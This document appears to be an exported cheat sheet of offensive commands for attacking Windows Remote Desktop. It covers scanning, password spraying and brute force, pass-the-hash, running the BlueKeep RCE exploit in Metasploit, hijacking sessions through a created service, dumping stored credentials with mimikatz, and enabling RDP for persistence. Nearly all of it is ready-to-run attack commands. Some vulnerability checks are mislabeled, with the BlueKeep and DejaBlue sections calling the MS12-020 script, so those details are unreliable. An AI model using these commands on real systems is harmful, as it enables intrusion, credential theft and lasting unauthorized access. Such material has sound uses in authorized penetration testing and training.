---
id: "89zv5s5ftmpsivfg3"
title: "rdp"
description: ""
tags: []
order: 10
createdAt: "2026-05-30T15:45:20.883Z"
updatedAt: "2026-05-30T15:45:30.056Z"
---

## Port Discovery & Scanning
<!-- section: {"id":"dgjm1ys1tmpsivm7a","order":0,"collapsed":false} -->

### t8v7kthlimpsivm98
```bash
nmap -sV -sC -p 3389 $TARGET
```

_Port Discovery & Scanning_

**Tags:** rdp, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"t8v7kthlimpsivm98","language":"bash","sectionId":"dgjm1ys1tmpsivm7a","tags":["rdp","nmap","rustscan","recon","discovery"]} -->

### ehcco9rrmmpsivm9d
```bash
nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-enum-encryption,rdp-vuln-ms12-020 $TARGET
```

**Tags:** rdp, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"ehcco9rrmmpsivm9d","language":"bash","sectionId":"dgjm1ys1tmpsivm7a","tags":["rdp","nmap","rustscan","recon","discovery"]} -->

### fr6acal6mmpsivm9i
```bash
rustscan -a $TARGET -p 3389 -- -sV --script rdp-enum-encryption
```

**Tags:** rdp, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"fr6acal6mmpsivm9i","language":"bash","sectionId":"dgjm1ys1tmpsivm7a","tags":["rdp","nmap","rustscan","recon","discovery"]} -->

### 3rbnv5gcdmpsivm9m
```bash
nmap -p 3389 --script rdp-enum-encryption $TARGET
```

**Tags:** rdp, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"3rbnv5gcdmpsivm9m","language":"bash","sectionId":"dgjm1ys1tmpsivm7a","tags":["rdp","nmap","rustscan","recon","discovery"]} -->

## RDP Authentication Check
<!-- section: {"id":"krru9ddi5mpsivm7f","order":1,"collapsed":false} -->

### 8fbl7f71fmpsivm9y
```bash
netexec rdp $TARGET -u $USER -p '$PASS'
```

_RDP Authentication Check_

**Tags:** rdp, authentication, netexec, credential-check
<!-- cmd: {"id":"8fbl7f71fmpsivm9y","language":"bash","sectionId":"krru9ddi5mpsivm7f","tags":["rdp","authentication","netexec","credential-check"]} -->

### sfkx8vd3empsivma2
```bash
netexec rdp $TARGET -u $USER -H $HASH
```

**Tags:** rdp, authentication, netexec, credential-check
<!-- cmd: {"id":"sfkx8vd3empsivma2","language":"bash","sectionId":"krru9ddi5mpsivm7f","tags":["rdp","authentication","netexec","credential-check"]} -->

### roi1xglbsmpsivma5
```bash
netexec rdp $TARGET -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

**Tags:** rdp, authentication, netexec, credential-check
<!-- cmd: {"id":"roi1xglbsmpsivma5","language":"bash","sectionId":"krru9ddi5mpsivm7f","tags":["rdp","authentication","netexec","credential-check"]} -->

## Password Spray / Brute Force
<!-- section: {"id":"ame8h7871mpsivm7k","order":2,"collapsed":false} -->

### 6ku98qmtmmpsivmae
```bash
hydra -L users.txt -P passwords.txt rdp://$TARGET -t 4 -f
```

_Password Spray / Brute Force_

**Tags:** rdp, password-spray, bruteforce, hydra, crowbar
<!-- cmd: {"id":"6ku98qmtmmpsivmae","language":"bash","sectionId":"ame8h7871mpsivm7k","tags":["rdp","password-spray","bruteforce","hydra","crowbar"]} -->

### z1a4ut31dmpsivmah
```bash
hydra -l $USER -P /usr/share/wordlists/rockyou.txt rdp://$TARGET
```

**Tags:** rdp, password-spray, bruteforce, hydra, crowbar
<!-- cmd: {"id":"z1a4ut31dmpsivmah","language":"bash","sectionId":"ame8h7871mpsivm7k","tags":["rdp","password-spray","bruteforce","hydra","crowbar"]} -->

### jzeodxhelmpsivmal
```bash
crowbar -b rdp -s $TARGET/32 -u $USER -C passwords.txt -n 1
```

**Tags:** rdp, password-spray, bruteforce, hydra, crowbar
<!-- cmd: {"id":"jzeodxhelmpsivmal","language":"bash","sectionId":"ame8h7871mpsivm7k","tags":["rdp","password-spray","bruteforce","hydra","crowbar"]} -->

### cxnsd3281mpsivmaq
```bash
netexec rdp $TARGET -u users.txt -p '$PASS' --continue-on-success
```

**Tags:** rdp, password-spray, bruteforce, hydra, crowbar
<!-- cmd: {"id":"cxnsd3281mpsivmaq","language":"bash","sectionId":"ame8h7871mpsivm7k","tags":["rdp","password-spray","bruteforce","hydra","crowbar"]} -->

### z9038dbapmpsivmat
```bash
netexec rdp hosts.txt -u $USER -p '$PASS' --continue-on-success
```

**Tags:** rdp, password-spray, bruteforce, hydra, crowbar
<!-- cmd: {"id":"z9038dbapmpsivmat","language":"bash","sectionId":"ame8h7871mpsivm7k","tags":["rdp","password-spray","bruteforce","hydra","crowbar"]} -->

## Pass-the-Hash RDP (Restricted Admin Mode)
<!-- section: {"id":"tpod015f4mpsivm7o","order":3,"collapsed":false} -->

### 3fg8tqnv1mpsivmb7
```bash
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

_Pass-the-Hash RDP (Restricted Admin Mode)_

**Tags:** rdp, pth, pass-the-hash, restricted-admin, lateral-movement
<!-- cmd: {"id":"3fg8tqnv1mpsivmb7","language":"bash","sectionId":"tpod015f4mpsivm7o","tags":["rdp","pth","pass-the-hash","restricted-admin","lateral-movement"]} -->

### kxchonhqxmpsivmbc
```bash
xfreerdp /v:$TARGET /u:$USER /pth:$HASH /cert:ignore /dynamic-resolution
```

**Tags:** rdp, pth, pass-the-hash, restricted-admin, lateral-movement
<!-- cmd: {"id":"kxchonhqxmpsivmbc","language":"bash","sectionId":"tpod015f4mpsivm7o","tags":["rdp","pth","pass-the-hash","restricted-admin","lateral-movement"]} -->

### c7pwyvwmxmpsivmbf
```bash
impacket-rdp_check $DOMAIN/$USER@$TARGET -hashes :$HASH
```

**Tags:** rdp, pth, pass-the-hash, restricted-admin, lateral-movement
<!-- cmd: {"id":"c7pwyvwmxmpsivmbf","language":"bash","sectionId":"tpod015f4mpsivm7o","tags":["rdp","pth","pass-the-hash","restricted-admin","lateral-movement"]} -->

## RDP Connection — Linux Tools
<!-- section: {"id":"2q6pnpvanmpsivm7s","order":4,"collapsed":false} -->

### 83g31z6m0mpsivmbo
```bash
xfreerdp /v:$TARGET /u:$USER /p:'$PASS' /cert:ignore /dynamic-resolution
```

_RDP Connection — Linux Tools_

**Tags:** rdp, xfreerdp, rdesktop, connection, lateral-movement
<!-- cmd: {"id":"83g31z6m0mpsivmbo","language":"bash","sectionId":"2q6pnpvanmpsivm7s","tags":["rdp","xfreerdp","rdesktop","connection","lateral-movement"]} -->

### pqxzbj65cmpsivmbs
```bash
xfreerdp /v:$TARGET /u:$USER /p:'$PASS' /cert:ignore /drive:share,/tmp /clipboard
```

**Tags:** rdp, xfreerdp, rdesktop, connection, lateral-movement
<!-- cmd: {"id":"pqxzbj65cmpsivmbs","language":"bash","sectionId":"2q6pnpvanmpsivm7s","tags":["rdp","xfreerdp","rdesktop","connection","lateral-movement"]} -->

### akuo0zsn4mpsivmbv
```bash
rdesktop -u $USER -p '$PASS' $TARGET
```

**Tags:** rdp, xfreerdp, rdesktop, connection, lateral-movement
<!-- cmd: {"id":"akuo0zsn4mpsivmbv","language":"bash","sectionId":"2q6pnpvanmpsivm7s","tags":["rdp","xfreerdp","rdesktop","connection","lateral-movement"]} -->

### x6orxlsbompsivmc0
```bash
xfreerdp /v:$TARGET /u:$USER /p:'$PASS' /d:$DOMAIN /cert:ignore
```

**Tags:** rdp, xfreerdp, rdesktop, connection, lateral-movement
<!-- cmd: {"id":"x6orxlsbompsivmc0","language":"bash","sectionId":"2q6pnpvanmpsivm7s","tags":["rdp","xfreerdp","rdesktop","connection","lateral-movement"]} -->

### y9xry15zrmpsivmc3
```bash
proxychains xfreerdp /v:$TARGET /u:$USER /p:'$PASS' /cert:ignore
```

**Tags:** rdp, xfreerdp, rdesktop, connection, lateral-movement
<!-- cmd: {"id":"y9xry15zrmpsivmc3","language":"bash","sectionId":"2q6pnpvanmpsivm7s","tags":["rdp","xfreerdp","rdesktop","connection","lateral-movement"]} -->

## Kerberos Authentication via RDP
<!-- section: {"id":"50cthkxpbmpsivm7v","order":5,"collapsed":false} -->

### wlav6w7rwmpsivmch
```bash
impacket-getTGT $DOMAIN/$USER:'$PASS' -dc-ip $DC
```

_Kerberos Authentication via RDP_

**Tags:** rdp, kerberos, authentication, ticket
<!-- cmd: {"id":"wlav6w7rwmpsivmch","language":"bash","sectionId":"50cthkxpbmpsivm7v","tags":["rdp","kerberos","authentication","ticket"]} -->

### rd3pvxv5lmpsivmcl
```bash
export KRB5CCNAME=./krb5cc
```

**Tags:** rdp, kerberos, authentication, ticket
<!-- cmd: {"id":"rd3pvxv5lmpsivmcl","language":"bash","sectionId":"50cthkxpbmpsivm7v","tags":["rdp","kerberos","authentication","ticket"]} -->

### mr7zujlmfmpsivmcp
```bash
xfreerdp /v:$TARGET /u:$USER /d:$DOMAIN /sec:nla /cert:ignore /kerberos
```

**Tags:** rdp, kerberos, authentication, ticket
<!-- cmd: {"id":"mr7zujlmfmpsivmcp","language":"bash","sectionId":"50cthkxpbmpsivm7v","tags":["rdp","kerberos","authentication","ticket"]} -->

## BlueKeep (CVE-2019-0708) Check
<!-- section: {"id":"w1m9zpycgmpsivm7z","order":6,"collapsed":false} -->

### zml9tf92nmpsivmcy
```bash
nmap -p 3389 --script rdp-vuln-ms12-020 $TARGET
```

_BlueKeep (CVE-2019-0708) Check_

**Tags:** rdp, bluekeep, cve-2019-0708, exploitation, rce, pre-auth
<!-- cmd: {"id":"zml9tf92nmpsivmcy","language":"bash","sectionId":"w1m9zpycgmpsivm7z","tags":["rdp","bluekeep","cve-2019-0708","exploitation","rce","pre-auth"]} -->

### kc4v2vpajmpsivmd2
```bash
nmap -p 3389 --script rdp-enum-encryption $TARGET
```

**Tags:** rdp, bluekeep, cve-2019-0708, exploitation, rce, pre-auth
<!-- cmd: {"id":"kc4v2vpajmpsivmd2","language":"bash","sectionId":"w1m9zpycgmpsivm7z","tags":["rdp","bluekeep","cve-2019-0708","exploitation","rce","pre-auth"]} -->

### li31lqv9ympsivmd6
```bash
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

**Tags:** rdp, bluekeep, cve-2019-0708, exploitation, rce, pre-auth
<!-- cmd: {"id":"li31lqv9ympsivmd6","language":"bash","sectionId":"w1m9zpycgmpsivm7z","tags":["rdp","bluekeep","cve-2019-0708","exploitation","rce","pre-auth"]} -->

### ca37ybnekmpsivmd9
```bash
set RHOSTS $TARGET
```

**Tags:** rdp, bluekeep, cve-2019-0708, exploitation, rce, pre-auth
<!-- cmd: {"id":"ca37ybnekmpsivmd9","language":"bash","sectionId":"w1m9zpycgmpsivm7z","tags":["rdp","bluekeep","cve-2019-0708","exploitation","rce","pre-auth"]} -->

### 7zfp2q88xmpsivmdd
```bash
run
```

**Tags:** rdp, bluekeep, cve-2019-0708, exploitation, rce, pre-auth
<!-- cmd: {"id":"7zfp2q88xmpsivmdd","language":"bash","sectionId":"w1m9zpycgmpsivm7z","tags":["rdp","bluekeep","cve-2019-0708","exploitation","rce","pre-auth"]} -->

### nyvbishrsmpsivmdh
```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**Tags:** rdp, bluekeep, cve-2019-0708, exploitation, rce, pre-auth
<!-- cmd: {"id":"nyvbishrsmpsivmdh","language":"bash","sectionId":"w1m9zpycgmpsivm7z","tags":["rdp","bluekeep","cve-2019-0708","exploitation","rce","pre-auth"]} -->

### hvw6z60svmpsivmdl
```bash
set RHOSTS $TARGET
```

**Tags:** rdp, bluekeep, cve-2019-0708, exploitation, rce, pre-auth
<!-- cmd: {"id":"hvw6z60svmpsivmdl","language":"bash","sectionId":"w1m9zpycgmpsivm7z","tags":["rdp","bluekeep","cve-2019-0708","exploitation","rce","pre-auth"]} -->

### movngeh5xmpsivmdo
```bash
set TARGET 2
```

**Tags:** rdp, bluekeep, cve-2019-0708, exploitation, rce, pre-auth
<!-- cmd: {"id":"movngeh5xmpsivmdo","language":"bash","sectionId":"w1m9zpycgmpsivm7z","tags":["rdp","bluekeep","cve-2019-0708","exploitation","rce","pre-auth"]} -->

### 86pt13ipympsivmds
```bash
run
```

**Tags:** rdp, bluekeep, cve-2019-0708, exploitation, rce, pre-auth
<!-- cmd: {"id":"86pt13ipympsivmds","language":"bash","sectionId":"w1m9zpycgmpsivm7z","tags":["rdp","bluekeep","cve-2019-0708","exploitation","rce","pre-auth"]} -->

## DejaBlue (CVE-2019-1181/1182) Check
<!-- section: {"id":"h288e65qwmpsivm82","order":7,"collapsed":false} -->

### ln8ghaaf6mpsivme7
```bash
nmap -p 3389 --script rdp-vuln-ms12-020 $TARGET
```

_DejaBlue (CVE-2019-1181/1182) Check_

**Tags:** rdp, dejablue, cve, vulnerability-check
<!-- cmd: {"id":"ln8ghaaf6mpsivme7","language":"bash","sectionId":"h288e65qwmpsivm82","tags":["rdp","dejablue","cve","vulnerability-check"]} -->

### 9w4fcbtbempsivmec
```bash
use auxiliary/scanner/rdp/cve_2019_1181_dejablue
```

**Tags:** rdp, dejablue, cve, vulnerability-check
<!-- cmd: {"id":"9w4fcbtbempsivmec","language":"bash","sectionId":"h288e65qwmpsivm82","tags":["rdp","dejablue","cve","vulnerability-check"]} -->

### y3iaf1x2cmpsivmeg
```bash
set RHOSTS $TARGET
```

**Tags:** rdp, dejablue, cve, vulnerability-check
<!-- cmd: {"id":"y3iaf1x2cmpsivmeg","language":"bash","sectionId":"h288e65qwmpsivm82","tags":["rdp","dejablue","cve","vulnerability-check"]} -->

### v3z0lqco3mpsivmek
```bash
run
```

**Tags:** rdp, dejablue, cve, vulnerability-check
<!-- cmd: {"id":"v3z0lqco3mpsivmek","language":"bash","sectionId":"h288e65qwmpsivm82","tags":["rdp","dejablue","cve","vulnerability-check"]} -->

## MS12-020 (CVE-2012-0152) DoS Check
<!-- section: {"id":"2l3rjab7vmpsivm87","order":8,"collapsed":false} -->

### gzyy53yn5mpsivmey
```bash
nmap -p 3389 --script rdp-vuln-ms12-020 $TARGET
```

_MS12-020 (CVE-2012-0152) DoS Check_

**Tags:** rdp, ms12-020, dos, vulnerability-check
<!-- cmd: {"id":"gzyy53yn5mpsivmey","language":"bash","sectionId":"2l3rjab7vmpsivm87","tags":["rdp","ms12-020","dos","vulnerability-check"]} -->

### 2ibzlhtjfmpsivmf1
```bash
use auxiliary/scanner/rdp/ms12_020_check
```

**Tags:** rdp, ms12-020, dos, vulnerability-check
<!-- cmd: {"id":"2ibzlhtjfmpsivmf1","language":"bash","sectionId":"2l3rjab7vmpsivm87","tags":["rdp","ms12-020","dos","vulnerability-check"]} -->

### k70sqdbl7mpsivmf6
```bash
set RHOSTS $TARGET
```

**Tags:** rdp, ms12-020, dos, vulnerability-check
<!-- cmd: {"id":"k70sqdbl7mpsivmf6","language":"bash","sectionId":"2l3rjab7vmpsivm87","tags":["rdp","ms12-020","dos","vulnerability-check"]} -->

### 7zlh34hufmpsivmf9
```bash
run
```

**Tags:** rdp, ms12-020, dos, vulnerability-check
<!-- cmd: {"id":"7zlh34hufmpsivmf9","language":"bash","sectionId":"2l3rjab7vmpsivm87","tags":["rdp","ms12-020","dos","vulnerability-check"]} -->

## RDP Session Hijacking (No Password)
<!-- section: {"id":"wbd74pozhmpsivm8a","order":9,"collapsed":false} -->

### l6grrfwqtmpsivmfi
```bash
query session
```

_RDP Session Hijacking (No Password) Hijack disconnected RDP sessions on a server._

**Tags:** rdp, session-hijacking, lateral-movement, privilege-escalation
<!-- cmd: {"id":"l6grrfwqtmpsivmfi","language":"bash","sectionId":"wbd74pozhmpsivm8a","tags":["rdp","session-hijacking","lateral-movement","privilege-escalation"]} -->

### tk2pwmsj4mpsivmfl
```bash
quser
```

**Tags:** rdp, session-hijacking, lateral-movement, privilege-escalation
<!-- cmd: {"id":"tk2pwmsj4mpsivmfl","language":"bash","sectionId":"wbd74pozhmpsivm8a","tags":["rdp","session-hijacking","lateral-movement","privilege-escalation"]} -->

### iduizhctcmpsivmfp
```bash
tscon 2 /dest:rdp-tcp#1
```

**Tags:** rdp, session-hijacking, lateral-movement, privilege-escalation
<!-- cmd: {"id":"iduizhctcmpsivmfp","language":"bash","sectionId":"wbd74pozhmpsivm8a","tags":["rdp","session-hijacking","lateral-movement","privilege-escalation"]} -->

### 3unvat30rmpsivmft
```bash
sc create hijack binpath= "cmd /k tscon 2 /dest:rdp-tcp#1"
```

**Tags:** rdp, session-hijacking, lateral-movement, privilege-escalation
<!-- cmd: {"id":"3unvat30rmpsivmft","language":"bash","sectionId":"wbd74pozhmpsivm8a","tags":["rdp","session-hijacking","lateral-movement","privilege-escalation"]} -->

### bbo0u51j8mpsivmfx
```bash
sc start hijack
```

**Tags:** rdp, session-hijacking, lateral-movement, privilege-escalation
<!-- cmd: {"id":"bbo0u51j8mpsivmfx","language":"bash","sectionId":"wbd74pozhmpsivm8a","tags":["rdp","session-hijacking","lateral-movement","privilege-escalation"]} -->

## RDP Credential Extraction (Post-Exploitation)
<!-- section: {"id":"1tqiz9nvkmpsivm8d","order":10,"collapsed":false} -->

### s2b8r9p5dmpsivmgc
```bash
mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "exit"
```

_RDP Credential Extraction (Post-Exploitation)_

**Tags:** rdp, credential-access, mimikatz, dpapi, post-exploitation
<!-- cmd: {"id":"s2b8r9p5dmpsivmgc","language":"bash","sectionId":"1tqiz9nvkmpsivm8d","tags":["rdp","credential-access","mimikatz","dpapi","post-exploitation"]} -->

### o07q2ki04mpsivmgg
```bash
cmdkey /list
```

**Tags:** rdp, credential-access, mimikatz, dpapi, post-exploitation
<!-- cmd: {"id":"o07q2ki04mpsivmgg","language":"bash","sectionId":"1tqiz9nvkmpsivm8d","tags":["rdp","credential-access","mimikatz","dpapi","post-exploitation"]} -->

### f46hesafcmpsivmgk
```bash
mimikatz.exe "dpapi::cred /in:C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\*" "exit"
```

**Tags:** rdp, credential-access, mimikatz, dpapi, post-exploitation
<!-- cmd: {"id":"f46hesafcmpsivmgk","language":"bash","sectionId":"1tqiz9nvkmpsivm8d","tags":["rdp","credential-access","mimikatz","dpapi","post-exploitation"]} -->

### mued7zshempsivmgo
```bash
python3 bmc-tools.py -s C:\Users\$USER\AppData\Local\Microsoft\Terminal\ Server\ Client\Cache\ -d ./rdp_cache/
```

**Tags:** rdp, credential-access, mimikatz, dpapi, post-exploitation
<!-- cmd: {"id":"mued7zshempsivmgo","language":"bash","sectionId":"1tqiz9nvkmpsivm8d","tags":["rdp","credential-access","mimikatz","dpapi","post-exploitation"]} -->

## RDP Honeypot / Canary Check
<!-- section: {"id":"0d0x9e40lmpsivm8i","order":11,"collapsed":false} -->

### vaeuz9jnxmpsivmgy
```bash
Get-WinEvent -LogName "Security" | Where-Object {$_.Id -eq 4624 -and $_.Message -like "*RDP*"}
```

_RDP Honeypot / Canary Check_

**Tags:** rdp, opsec, detection
<!-- cmd: {"id":"vaeuz9jnxmpsivmgy","language":"bash","sectionId":"0d0x9e40lmpsivm8i","tags":["rdp","opsec","detection"]} -->

## Persistence via RDP
<!-- section: {"id":"gwurapnt0mpsivm8l","order":12,"collapsed":false} -->

### q5m7b7cxumpsivmha
```bash
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

_Persistence via RDP_

**Tags:** rdp, persistence, enable-rdp, lateral-movement
<!-- cmd: {"id":"q5m7b7cxumpsivmha","language":"bash","sectionId":"gwurapnt0mpsivm8l","tags":["rdp","persistence","enable-rdp","lateral-movement"]} -->

### 1a0sop9w7mpsivmhd
```bash
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

**Tags:** rdp, persistence, enable-rdp, lateral-movement
<!-- cmd: {"id":"1a0sop9w7mpsivmhd","language":"bash","sectionId":"gwurapnt0mpsivm8l","tags":["rdp","persistence","enable-rdp","lateral-movement"]} -->

### oho8g4pwzmpsivmhh
```bash
net localgroup "Remote Desktop Users" $USER /add
```

**Tags:** rdp, persistence, enable-rdp, lateral-movement
<!-- cmd: {"id":"oho8g4pwzmpsivmhh","language":"bash","sectionId":"gwurapnt0mpsivm8l","tags":["rdp","persistence","enable-rdp","lateral-movement"]} -->

### uj16g621empsivmhl
```bash
netexec smb $TARGET -u $USER -p '$PASS' -M rdp --options action=enable
```

**Tags:** rdp, persistence, enable-rdp, lateral-movement
<!-- cmd: {"id":"uj16g621empsivmhl","language":"bash","sectionId":"gwurapnt0mpsivm8l","tags":["rdp","persistence","enable-rdp","lateral-movement"]} -->

## NSE Scripts — Comprehensive Scan
<!-- section: {"id":"cf3y6tspgmpsivm8o","order":13,"collapsed":false} -->

### bp4a7j1knmpsivmhv
```bash
nmap -p 3389 --script "rdp-*" $TARGET
```

_NSE Scripts — Comprehensive Scan_

**Tags:** rdp, nmap, nse, vulnerability-scan
<!-- cmd: {"id":"bp4a7j1knmpsivmhv","language":"bash","sectionId":"cf3y6tspgmpsivm8o","tags":["rdp","nmap","nse","vulnerability-scan"]} -->

### anvh8hbzkmpsivmhy
```bash
nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $TARGET
```

**Tags:** rdp, nmap, nse, vulnerability-scan
<!-- cmd: {"id":"anvh8hbzkmpsivmhy","language":"bash","sectionId":"cf3y6tspgmpsivm8o","tags":["rdp","nmap","nse","vulnerability-scan"]} -->

## Common Misconfigurations
<!-- section: {"id":"groztugn2mpsivm8s","order":14,"collapsed":false} -->

### 8awdta5v2mpsivmig
```bash
nmap -p 3389 $TARGET
```

_Common Misconfigurations_

**Tags:** rdp, misconfiguration, nla, encryption, password-reuse
<!-- cmd: {"id":"8awdta5v2mpsivmig","language":"bash","sectionId":"groztugn2mpsivm8s","tags":["rdp","misconfiguration","nla","encryption","password-reuse"]} -->

### chs9jxgtbmpsivmik
```bash
nmap -p 3389 --script rdp-enum-encryption $TARGET | grep -i "NLA"
```

**Tags:** rdp, misconfiguration, nla, encryption, password-reuse
<!-- cmd: {"id":"chs9jxgtbmpsivmik","language":"bash","sectionId":"groztugn2mpsivm8s","tags":["rdp","misconfiguration","nla","encryption","password-reuse"]} -->

### lqdx5fr9hmpsivmio
```bash
nmap -p 3389 --script rdp-enum-encryption $TARGET | grep -i "RC4"
```

**Tags:** rdp, misconfiguration, nla, encryption, password-reuse
<!-- cmd: {"id":"lqdx5fr9hmpsivmio","language":"bash","sectionId":"groztugn2mpsivm8s","tags":["rdp","misconfiguration","nla","encryption","password-reuse"]} -->

### lace1p3lxmpsivmis
```bash
netexec rdp hosts.txt -u Administrator -p '$PASS' --continue-on-success
```

**Tags:** rdp, misconfiguration, nla, encryption, password-reuse
<!-- cmd: {"id":"lace1p3lxmpsivmis","language":"bash","sectionId":"groztugn2mpsivm8s","tags":["rdp","misconfiguration","nla","encryption","password-reuse"]} -->

### iurys4fb5mpsivmiw
```bash
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
```

**Tags:** rdp, misconfiguration, nla, encryption, password-reuse
<!-- cmd: {"id":"iurys4fb5mpsivmiw","language":"bash","sectionId":"groztugn2mpsivm8s","tags":["rdp","misconfiguration","nla","encryption","password-reuse"]} -->
